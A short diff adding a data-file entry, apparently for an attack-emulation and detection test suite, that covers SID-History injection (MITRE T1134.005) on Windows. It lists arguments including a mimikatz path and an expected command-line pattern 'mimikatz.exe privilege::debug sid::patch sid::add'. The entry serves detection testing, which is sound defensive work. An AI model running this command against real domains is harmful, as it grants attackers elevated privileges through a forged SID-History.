@@ -1,0 +1,5 @@
+T1134.005,windows,6bef32e5,Injection SID-History with mimikatz
+ARG,sid_to_inject,S-1-5-21-1004336348-1177238915-682003330-1134
+ARG,sam_account_name,%username%
+ARG,mimikatz_path,PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+_E_,Process,cmdline~=mimikatz.exe privilege::debug sid::patch sid::add /sid:#{sid_to_inject}
